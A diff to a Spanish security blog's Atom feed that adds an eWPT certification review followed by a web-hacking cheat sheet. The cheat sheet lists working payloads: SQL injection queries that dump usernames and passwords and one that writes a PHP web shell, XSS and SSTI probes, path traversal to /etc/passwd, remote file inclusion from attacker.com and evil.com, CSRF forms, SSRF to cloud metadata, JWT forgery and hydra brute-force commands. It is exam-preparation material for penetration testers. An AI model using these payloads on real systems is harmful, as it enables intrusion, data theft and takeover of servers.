@@ -1,4 +1,329 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-03-02T17:53:48-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pwn3t | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad y CTFs</subtitle><author><name>Kyzk3</name></author><entry><title type="html">eJPT Review 2026</title><link href="http://localhost:4000/eJPT/" rel="alternate" type="text/html" title="eJPT Review 2026" /><published>2026-03-02T00:00:00-05:00</published><updated>2026-03-02T00:00:00-05:00</updated><id>http://localhost:4000/eJPT</id><content type="html" xml:base="http://localhost:4000/eJPT/"><![CDATA[<p align="center">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-04-20T21:34:24-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pwn3t | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad y CTFs</subtitle><author><name>Kyzk3</name></author><entry><title type="html">eWPT Review 2026</title><link href="http://localhost:4000/eWPT/" rel="alternate" type="text/html" title="eWPT Review 2026" /><published>2026-04-19T00:00:00-05:00</published><updated>2026-04-19T00:00:00-05:00</updated><id>http://localhost:4000/eWPT</id><content type="html" xml:base="http://localhost:4000/eWPT/"><![CDATA[<p align="center">
+<img src="/assets/certs/Cert-eWPT.png" />
+</p>
+
+<h2 id="cómo-es-el-examen">¿Cómo es el examen?</h2>
+
+<p>El eWPT es un examen práctico compuesto por 50 preguntas tipo test que deben resolverse en un plazo de 10 horas. Se desarrolla en un laboratorio que incluye entre 3 y 5 hosts, donde cada uno puede exponer múltiples servicios HTTP en distintos puertos. Además, es común encontrar diferentes tecnologías ejecutándose en cada uno de estos servicios, lo que requiere identificar y explotar diversas superficies de ataque dentro del entorno.</p>
+
+<h2 id="motivo-de-sacarme-el-examen">Motivo de sacarme el examen</h2>
+
+<p>Decidí rendir el eWPT aproximadamente un mes después de obtener el eJPT, periodo en el que reforcé mis conocimientos en vulnerabilidades web. La principal razón fue validar de forma objetiva mi nivel en hacking web, ya que es el área en la que más he trabajado y profundizado. Más que buscar solo la certificación, quería medir mis habilidades y confirmar si mi base técnica y metodología eran suficientes, utilizando el examen como una referencia clara de mi progreso en este campo.</p>
+
+<h2 id="experiencia-durante-el-examen-y-gestión-del-tiempo">Experiencia durante el examen y gestión del tiempo</h2>
+
+<p>Durante el examen utilicé prácticamente las 10 horas completas, ya que al inicio me encontré con un escenario que parecía un <strong>rabbit hole</strong>: una parte sin aparente solución, pero que estaba relacionada con una pregunta que requería haber comprometido el sitio. Esto me hizo perder gran parte del tiempo probando distintas opciones sin éxito hasta que finalmente logré resolverlo. Por eso, es importante gestionar bien el tiempo, ya que aunque 10 horas parecen suficientes, es fácil quedarse estancado sin darse cuenta.</p>
+
+<p>Al terminar todas las preguntas me quedaban unos 5 minutos, por lo que decidí revisarlas pensando que el examen se enviaría automáticamente al acabarse el tiempo. Fue un error: si no envías las respuestas manualmente dentro del plazo, el sistema te califica como desaprobado. Afortunadamente, el examen incluye dos intentos, así que 30 minutos después lo volví a rendir y esta vez lo aprobé.</p>
+
+<h2 id="impresiones-del-examen">Impresiones del examen</h2>
+
+<p>El examen está muy enfocado en la enumeración y el discovery: se presentan varias IPs con subdominios donde debes identificar múltiples aplicaciones web y analizarlas en profundidad. Prácticamente cada aplicación que descubres tiene al menos una vulnerabilidad, por lo que el reto está en encontrarlas todas sin dejar nada sin revisar. A nivel técnico, se centra en hacking web básico, con vulnerabilidades como XSS, SQLi, Broken Access Control y ataques de fuerza bruta, entre otras.</p>
+
+<p>En muchos casos no es necesario escalar privilegios, por lo que es importante analizar bien las preguntas para entender hasta qué punto te piden llegar. Las vulnerabilidades son bastante básicas y sin demasiada complejidad; si ya entiendes el concepto o lo has practicado al menos una vez, sabrás cómo abordarlas.</p>
+
+<p>Respecto al entorno de trabajo, el laboratorio deja mucho que desear: la máquina proporcionada es limitada, sin acceso a internet y con problemas como un portapapeles poco funcional, lo que dificulta trabajar con la misma comodidad que en un entorno propio.</p>
+
+<p>También presenta un problema similar al eJPT: hay preguntas que prácticamente te indican a qué es vulnerable la máquina, lo que le quita realismo. Además, aunque en menor medida, se abusa del concepto de fuerza bruta, algo que considero poco realista en escenarios reales. En su lugar, hubiera sido más interesante incluir una mayor variedad de vulnerabilidades web o conceptos más actuales.</p>
+
+<h2 id="conocimientos-que-debes-dominar-antes-de-rendirlo">Conocimientos que debes dominar antes de rendirlo</h2>
+
+<p>Para aprobar el eWPT debes conocer estas vulnerabilidades y conceptos webs.</p>
+
+<h3 id="1-inyecciones">1. Inyecciones</h3>
+
+<ul>
+  <li>SQL Injection (SQLi)</li>
+  <li>LDAP Injection</li>
+  <li>SSTI (Server-Side Template Injection)</li>
+</ul>
+
+<h3 id="2-cross-site-scripting-xss">2. Cross-Site Scripting (XSS)</h3>
+
+<ul>
+  <li>XSS reflejado</li>
+  <li>XSS almacenado</li>
+  <li>XSS DOM-based</li>
+</ul>
+
+<h3 id="3-control-de-acceso">3. Control de Acceso</h3>
+
+<ul>
+  <li>IDOR</li>
+  <li>Broken Access Control</li>
+</ul>
+
+<h3 id="4-autenticación-y-sesiones">4. Autenticación y sesiones</h3>
+
+<ul>
+  <li>HTTP Basic Authentication</li>
+  <li>HTTP Digest Authentication</li>
+  <li>Brute Force</li>
+  <li>Weak Authentication</li>
+</ul>
+
+<h3 id="5-inclusión-de-archivos">5. Inclusión de archivos</h3>
+
+<ul>
+  <li>Path Traversal</li>
+  <li>LFI (Local File Inclusion)</li>
+  <li>RFI (Remote File Inclusion)</li>
+  <li>File Upload</li>
+</ul>
+
+<h3 id="6-request-forgery">6. Request Forgery</h3>
+
+<ul>
+  <li>CSRF</li>
+  <li>SSRF</li>
+</ul>
+
+<h3 id="7-tokens-y-criptografía">7. Tokens y criptografía</h3>
+
+<ul>
+  <li>JWT</li>
+  <li>Criptografía débil (tokens predecibles)</li>
+</ul>
+
+<h2 id="recursos-que-recomiendo-para-preparar-el-ewpt">Recursos que recomiendo para preparar el eWPT</h2>
+
+<p>Si estás pensando en rendir el eWPT, estos son los recursos que considero más útiles para llegar con una base sólida y una metodología clara.</p>
+
+<p><strong>Plataformas para practicar máquinas</strong></p>
+
+<p>Para practicar, recomiendo los laboratorios de <code class="language-plaintext highlighter-rouge">PortSwigger</code>. Esta plataforma aborda en profundidad y de manera clara la mayoría de las vulnerabilidades web. Aunque no es necesario completar todos los laboratorios para aprobar el examen, te proporcionará una base muy sólida en pentesting web.</p>
+
+<p><strong>Repositorio de payloads para pentesting web</strong></p>
+
+<ul>
+  <li>https://github.com/swisskyrepo/payloadsallthethings</li>
+</ul>
+
+<h1 id="cheat-sheet">Cheat Sheet</h1>
+
+<h2 id="i-inyecciones">I. Inyecciones</h2>
+
+<h3 id="sql-injection-sqli">SQL Injection (SQLi)</h3>
+
+<ul>
+  <li>🔍 1. Descubrir el número de columnas
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' order by 3-- -
+</span></code></pre></div>    </div>
+  </li>
+  <li>➕ 2. Probar <code class="language-plaintext highlighter-rouge">UNION SELECT</code>
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' union select 1,2,4-- -
+</span></code></pre></div>    </div>
+    <blockquote>
+      <p>Verifica si <code class="language-plaintext highlighter-rouge">UNION</code> funciona para combinar resultados con otra consulta, según el numero de columnas.</p>
+    </blockquote>
+  </li>
+  <li>💤 3. Detección de vulnerabilidad (time-based)
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and sleep(5)-- -
+</span></code></pre></div>    </div>
+    <blockquote>
+      <p>Si la respuesta se <strong>retrasa 5 segundos</strong>, indica que la consulta fue ejecutada: es vulnerable a <strong>SQLi</strong>.</p>
+    </blockquote>
+  </li>
+  <li>🧬 4. Mostrar la base de datos en uso
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' union select database()-- -
+</span></code></pre></div>    </div>
+    <blockquote>
+      <p>Muestra el nombre de la base de datos activa.</p>
+    </blockquote>
+  </li>
+  <li>🗃️ 5. Listar todas las bases de datos
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' union select group_concat(schema_name) from information_schema.schemata-- -
+</span></code></pre></div>    </div>
+    <blockquote>
+      <p>Devuelve todos los nombres de bases de datos disponibles en el servidor.</p>
+    </blockquote>
+  </li>
+  <li>📑 6. Mostrar tablas de una base de datos
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">id</span><span class="o">=</span><span class="mi">123123</span><span class="s1">' union select group_concat(table_name)
+from information_schema.tables
+where table_schema='</span><span class="n">users_db</span><span class="s1">'-- -
+</span></code></pre></div>    </div>
+    <blockquote>
+      <p>Enumera las tablas dentro de la base de datos <code class="language-plaintext highlighter-rouge">users_db</code>.</p>
+    </blockquote>
+  </li>
+  <li>🧱 7. Mostrar columnas de una tablas
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">id</span><span class="o">=</span><span class="mi">7372</span><span class="s1">' union select group_concat(column_name)
+from information_schema.columns
+where table_schema='</span><span class="n">users_db</span><span class="s1">'
+and table_name='</span><span class="n">users</span><span class="s1">'-- -
+</span></code></pre></div>    </div>
+    <blockquote>
+      <p>Devuelve todas las columnas de la tabla <code class="language-plaintext highlighter-rouge">users</code> en <code class="language-plaintext highlighter-rouge">users_db</code>.</p>
+    </blockquote>
+  </li>
+  <li>📥 8. Extraer datos de una tabla
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' union select group_concat(username,0x3a,password) from users_db.users-- -
+</span></code></pre></div>    </div>
+    <blockquote>
+      <p>Lista los valores almacenados en la columna <code class="language-plaintext highlighter-rouge">username</code>, 0x3a es : en hexadecimal.</p>
+    </blockquote>
+  </li>
+  <li>⚠️ 9. Para agregar un archivo con contenido en una ruta especifica
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' union select "&lt;?php system($_GET['</span><span class="n">command</span><span class="s1">']); ?&gt;" into outfile "/var/www/html/prueba.php"-- -
+</span></code></pre></div>    </div>
+  </li>
+</ul>
+
+<h3 id="server-side-template-injection-ssti">Server-Side Template Injection (SSTI)</h3>
+
+<p><strong>Server-Side Template Injection</strong> es una vulnerabilidad que permite a un atacante <strong>inyectar código malicioso</strong> en el motor de plantillas del servidor.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span> <span class="p">{</span> <span class="mi">7</span><span class="o">*</span><span class="mi">7</span> <span class="p">}</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Si la salida muestra <code class="language-plaintext highlighter-rouge">49</code>, significa que el código fue interpretado por el motor de plantillas → <strong>vulnerabilidad SSTI confirmada</strong>.</p>
+</blockquote>
+
+<ul>
+  <li>🔍 <strong>Detección de tecnologías</strong></li>
+</ul>
+
+<p>Antes de explotar SSTI, el atacante puede:</p>
+
+<ol>
+  <li>Usar herramientas como <strong>WhatWeb</strong>, <strong>Wappalyzer</strong> o <strong>nmap</strong> para identificar frameworks:
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">Flask</code> → usa <code class="language-plaintext highlighter-rouge">Jinja2</code> (vulnerable si mal configurado).</li>
+      <li><code class="language-plaintext highlighter-rouge">Django</code>, <code class="language-plaintext highlighter-rouge">Rails</code>, etc. también pueden serlo si no se filtra correctamente la entrada.</li>
+    </ul>
+  </li>
+  <li>Confirmar que se trata de un motor vulnerable enviando payloads de prueba como:
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span> <span class="p">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}</span> <span class="p">},</span> <span class="p">{</span> <span class="p">{</span><span class="mi">1337</span><span class="o">*</span><span class="mi">42</span><span class="p">}</span> <span class="p">},</span> <span class="p">{</span> <span class="p">{</span><span class="n">config</span><span class="p">}</span> <span class="p">},</span> <span class="p">{</span> <span class="p">{</span><span class="s">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">__subclasses__</span><span class="p">()}</span> <span class="p">}</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="ii-cross-site-scripting-xss">II. Cross-Site Scripting (XSS)</h2>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Detectar XSS básico --&gt;</span>
+<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+
+<span class="c">&lt;!-- Reflejado (en parámetros URL) --&gt;</span>
+?search=<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+
+<span class="c">&lt;!-- Evadir filtros simples --&gt;</span>
+<span class="nt">&lt;svg</span><span class="err">/</span><span class="na">onload=</span><span class="s">alert(1)</span><span class="nt">&gt;</span>
+"&gt;<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert(1)</span><span class="nt">&gt;</span>
+
+<span class="c">&lt;!-- DOM-based más claro --&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+  <span class="c1">// La web toma lo que está en la URL (#) y lo inserta en el HTML</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">output</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">;</span>
+<span class="nt">&lt;/script&gt;</span>
+
+<span class="c">&lt;!-- URL maliciosa --&gt;</span>
+#<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert(1)</span><span class="nt">&gt;</span>
+
+<span class="c">&lt;!-- Resultado: se ejecuta el alert porque el contenido del hash se inserta sin filtrar --&gt;</span>
+</code></pre></div></div>
+
+<h2 id="iii-control-de-acceso">III. Control de Acceso</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># IDOR (cambiar IDs directamente)
+</span><span class="n">GET</span> <span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="mi">123</span>   <span class="err">→</span> <span class="n">usuario</span> <span class="n">normal</span>
+<span class="n">GET</span> <span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="mi">124</span>   <span class="err">→</span> <span class="n">acceso</span> <span class="n">a</span> <span class="n">otro</span> <span class="n">usuario</span>
+
+<span class="c1">## IDOR (modificar recurso)
+</span><span class="n">POST</span> <span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">updateEmail</span>
+<span class="p">{</span>
+  <span class="s">"user_id"</span><span class="p">:</span> <span class="mi">124</span><span class="p">,</span>
+  <span class="s">"email"</span><span class="p">:</span> <span class="s">"attacker@mail.com"</span>
+<span class="p">}</span>
+
+<span class="c1"># Broken Access Control (forzar acciones restringidas)
+</span><span class="n">GET</span> <span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">panel</span>        <span class="err">→</span> <span class="n">acceso</span> <span class="n">sin</span> <span class="n">permisos</span>
+<span class="n">POST</span> <span class="o">/</span><span class="n">deleteUser</span><span class="err">?</span><span class="nb">id</span><span class="o">=</span><span class="mi">1</span>   <span class="err">→</span> <span class="n">eliminar</span> <span class="n">sin</span> <span class="n">ser</span> <span class="n">admin</span>
+
+<span class="c1">## Broken Access Control (cambiar rol)
+</span><span class="n">POST</span> <span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">changeRole</span>
+<span class="p">{</span>
+  <span class="s">"user"</span><span class="p">:</span> <span class="s">"juan"</span><span class="p">,</span>
+  <span class="s">"role"</span><span class="p">:</span> <span class="s">"admin"</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="iv-autenticación-y-sesiones">IV. Autenticación y sesiones</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb &lt;TARGET_IP&gt;
+http &lt;TARGET_IP&gt;
+browsh <span class="nt">--startup-url</span> http://&lt;TARGET_IP&gt;
+
+dirb http://&lt;TARGET_IP&gt;
+dirb http://&lt;TARGET_IP&gt; /usr/share/metasploit-framework/data/wordlists/directory.txt
+
+hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt example.com http-head /admin/ <span class="c">#brute http basic auth</span>
+hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt example.com http-get /admin/ <span class="c">#brute http digest</span>
+hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt example.com https-post-form <span class="s2">"/login.php:username=^USER^&amp;password=^PASS^&amp;login=Login:Not allowed"</span> <span class="c"># brute http post form</span>
+hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt example.com https-post-form <span class="s2">"/login.php:username=^USER^&amp;password=^PASS^&amp;login=Login:Not allowed:H=Cookie</span><span class="se">\:</span><span class="s2"> PHPSESSID=if0kg4ss785kmov8bqlbusva3v"</span> <span class="c">#brute http authenticated post form</span>
+
+wget &lt;TARGET_IP&gt;
+curl &lt;TARGET_IP&gt; | more
+curl <span class="nt">-I</span> http://&lt;TARGET_IP&gt;/&lt;DIR&gt;
+curl <span class="nt">--digest</span> <span class="nt">-u</span> &lt;USER&gt;:&lt;PW&gt; http://&lt;TARGET_IP&gt;/&lt;DIR&gt;
+
+lynx &lt;TARGET_IP&gt;
+</code></pre></div></div>
+
+<h2 id="v-inclusión-de-archivos">V. Inclusión de archivos</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Path Traversal (acceder a archivos fuera del directorio)
+</span><span class="n">GET</span> <span class="o">/</span><span class="n">download</span><span class="err">?</span><span class="nb">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+<span class="n">GET</span> <span class="o">/</span><span class="n">image</span><span class="err">?</span><span class="n">name</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">win</span><span class="p">.</span><span class="n">ini</span>
+
+<span class="c1"># LFI (incluir archivos locales)
+</span><span class="n">GET</span> <span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="n">page</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+<span class="n">GET</span> <span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="n">page</span><span class="o">=</span><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="nb">filter</span><span class="o">/</span><span class="n">convert</span><span class="p">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">index</span><span class="p">.</span><span class="n">php</span>
+
+<span class="c1"># RFI (incluir archivos remotos)
+</span><span class="n">GET</span> <span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="n">page</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attacker</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">GET</span> <span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="n">page</span><span class="o">=</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">evil</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">malicious</span><span class="p">.</span><span class="n">php</span>
+
+<span class="c1"># File Upload (subir archivos maliciosos)
+</span><span class="n">Subir</span><span class="p">:</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span>  <span class="err">→</span> <span class="n">ejecutar</span> <span class="n">código</span> <span class="n">en</span> <span class="n">el</span> <span class="n">servidor</span>
+<span class="n">Subir</span><span class="p">:</span> <span class="n">image</span><span class="p">.</span><span class="n">php</span><span class="p">.</span><span class="n">jpg</span> <span class="err">→</span> <span class="n">evadir</span> <span class="n">validaciones</span> <span class="n">y</span> <span class="n">ejecutar</span>
+</code></pre></div></div>
+
+<h2 id="vi-request-forgery">VI. Request Forgery</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># CSRF (forzar acciones en nombre del usuario)
+</span><span class="o">&lt;</span><span class="n">form</span> <span class="n">action</span><span class="o">=</span><span class="s">"https://victima.com/change-email"</span> <span class="n">method</span><span class="o">=</span><span class="s">"POST"</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="n">name</span><span class="o">=</span><span class="s">"email"</span> <span class="n">value</span><span class="o">=</span><span class="s">"attacker@mail.com"</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">CSRF</span> <span class="p">(</span><span class="n">GET</span><span class="p">)</span> <span class="o">--&gt;</span>
+<span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">"https://victima.com/deleteAccount?id=1"</span><span class="o">&gt;</span>
+
+<span class="c1"># SSRF (el servidor hace requests internos)
+</span><span class="n">GET</span> <span class="o">/</span><span class="n">fetch</span><span class="err">?</span><span class="n">url</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">80</span>
+<span class="n">GET</span> <span class="o">/</span><span class="n">api</span><span class="err">?</span><span class="n">url</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">169.254</span><span class="p">.</span><span class="mf">169.254</span><span class="o">/</span><span class="n">latest</span><span class="o">/</span><span class="n">meta</span><span class="o">-</span><span class="n">data</span>
+</code></pre></div></div>
+
+<h2 id="vii-tokens-y-criptografía">VII. Tokens y Criptografía</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># JWT (manipulación del token - paso 1)
+</span><span class="n">eyJhbGciOiJub25lIn0</span><span class="p">.</span><span class="n">eyJ1c2VyIjoiZ3Vlc3QifQ</span><span class="p">.</span>
+<span class="err">→</span> <span class="n">intenta</span> <span class="n">cambiar</span> <span class="n">la</span> <span class="n">data</span> <span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="n">sin</span> <span class="n">mandar</span> <span class="n">una</span> <span class="n">firma</span> <span class="n">válida</span> <span class="n">para</span> <span class="n">ver</span> <span class="n">si</span> <span class="n">la</span> <span class="n">web</span> <span class="n">lo</span> <span class="n">acepta</span>
+
+<span class="c1"># JWT (manipulación del token - paso 2)
+</span><span class="n">eyJhbGciOiJub25lIn0</span><span class="p">.</span><span class="n">eyJ1c2VyIjoiYWRtaW4ifQ</span><span class="p">.</span>
+<span class="err">→</span> <span class="n">cambiar</span> <span class="s">"user"</span><span class="p">:</span><span class="s">"admin"</span> <span class="n">si</span> <span class="n">no</span> <span class="n">se</span> <span class="n">valida</span> <span class="n">la</span> <span class="n">firma</span>
+
+<span class="c1"># Recurso útil
+</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">jwt</span><span class="p">.</span><span class="n">io</span><span class="o">/</span>
+
+<span class="c1"># Criptografía débil (tokens predecibles)
+</span><span class="n">Token</span><span class="p">:</span> <span class="n">user_12345</span>
+<span class="n">Token</span><span class="p">:</span> <span class="n">user_12346</span>   <span class="err">→</span> <span class="n">patrón</span> <span class="n">predecible</span>
+
+<span class="c1"># Otro ejemplo (uso de md5/sha1 sin protección)
+</span><span class="n">md5</span><span class="p">(</span><span class="s">"admin"</span><span class="p">)</span> <span class="err">→</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span>
+</code></pre></div></div>]]></content><author><name>Kyzk3</name></author><category term="Certificaciones" /><category term="eWPTv2" /><category term="Review" /><summary type="html"><![CDATA[Este artículo analiza el examen eWPT, explicando su estructura, nivel real de dificultad y los conocimientos necesarios para aprobarlo, junto con mi experiencia y recursos recomendados para prepararte.]]></summary></entry><entry><title type="html">eJPT Review 2026</title><link href="http://localhost:4000/eJPT/" rel="alternate" type="text/html" title="eJPT Review 2026" /><published>2026-03-02T00:00:00-05:00</published><updated>2026-03-02T00:00:00-05:00</updated><id>http://localhost:4000/eJPT</id><content type="html" xml:base="http://localhost:4000/eJPT/"><![CDATA[<p align="center">
 <img src="/assets/certs/Cert-eJPT.png" />
 </p>
 
